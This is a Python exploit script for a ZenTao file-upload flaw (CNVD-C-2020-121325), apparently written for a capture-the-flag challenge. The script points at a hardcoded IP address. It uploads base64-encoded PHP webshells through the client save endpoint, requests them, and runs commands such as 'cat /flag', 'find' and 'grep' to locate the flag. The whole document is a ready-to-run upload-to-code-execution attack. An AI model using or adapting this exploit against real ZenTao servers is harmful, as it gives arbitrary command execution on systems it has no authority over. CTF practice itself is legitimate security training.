#!/usr/bin/env python3
"""
禅道漏洞利用 - 使用正确的 Payload 获取 Flag
"""

import requests
import base64

requests.packages.urllib3.disable_warnings()

def exploit_zentao():
    base_url = "http://47.113.178.182:32829"

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道 CNVD-C-2020-121325 - Final Exploit                  ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # Payload: <?php echo "---SUCCESS---"; system('cat /flag'); system('ls /'); ?>
    # 这个 payload 已经是 base64 编码的
    payload_base64 = "PD9waHAgZWNobyAiLS0tU1VDQ0VTUy0tLSI7IHN5c3RlbSgnY2F0IC9mbGFnJyk7IHN5c3RlbSgnbHMgLycpOyA/Pg=="

    # 解码查看内容
    payload_decoded = base64.b64decode(payload_base64).decode()
    print(f"[*] Payload 内容: {payload_decoded}")

    # 上传 Webshell
    filename = "getflag.php"
    upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename}"

    print(f"\n[*] 上传 Webshell: {filename}")
    print(f"[*] 上传 URL: {upload_url}")

    try:
        # 上传 (发送 base64 编码的内容)
        resp = requests.post(upload_url, data=payload_base64, timeout=10)
        print(f"[*] 上传状态码: {resp.status_code}")

        # 访问上传的 shell
        shell_url = f"{base_url}/zentao/data/client/1/{filename}"
        print(f"\n[*] 访问 Webshell: {shell_url}")

        resp = requests.get(shell_url, timeout=10)
        print(f"[*] 响应状态码: {resp.status_code}")

        if resp.status_code == 200:
            print("\n" + "=" * 70)
            print("🚩 执行结果:")
            print("=" * 70)
            print(resp.text)
            print("=" * 70)

            # 检查是否成功
            if "---SUCCESS---" in resp.text:
                print("\n[+] ✓ Payload 执行成功!")

                # 提取 Flag
                if "flag{" in resp.text.lower() or "ctf{" in resp.text.lower():
                    print("\n[+] ✓ Flag 已获取!")
                else:
                    print("\n[*] 在输出中查找 Flag")

            return resp.text
        else:
            print(f"[-] 访问失败: {resp.status_code}")

    except Exception as e:
        print(f"[-] 错误: {e}")

    return None


def try_alternative_payloads():
    """尝试其他 payload 变体"""
    base_url = "http://47.113.178.182:32829"

    print("\n[*] 尝试其他命令...")

    # 其他可能有用的 payload
    payloads = [
        "<?php system('cat /flag'); ?>",
        "<?php system('find / -name flag* 2>/dev/null'); ?>",
        "<?php system('grep -r flag{ / 2>/dev/null'); ?>",
        "<?php system('cat /var/www/html/flag.txt'); ?>",
    ]

    for i, payload in enumerate(payloads):
        # Base64 编码
        encoded = base64.b64encode(payload.encode()).decode()

        filename = f"flag{i}.php"
        upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename}"

        print(f"\n[*] 测试 payload {i+1}: {payload}")

        try:
            # 上传
            requests.post(upload_url, data=encoded, timeout=10)

            # 访问
            shell_url = f"{base_url}/zentao/data/client/1/{filename}"
            resp = requests.get(shell_url, timeout=10)

            if resp.text.strip():
                print(f"    输出: {resp.text.strip()}")

                if "flag{" in resp.text.lower() or "ctf{" in resp.text.lower():
                    print("\n" + "=" * 70)
                    print("🚩 找到 Flag!")
                    print("=" * 70)
                    return resp.text

        except Exception as e:
            print(f"    错误: {e}")

    return None


def main():
    # 使用主要 payload
    result = exploit_zentao()

    # 如果主 payload 没有获取到 flag，尝试其他方式
    if not result or ("flag{" not in result.lower() and "ctf{" not in result.lower()):
        print("\n[*] 主 payload 未找到明显的 flag，尝试其他方式...")
        try_alternative_payloads()

    print("\n[*] 利用完成!")


if __name__ == "__main__":
    main()
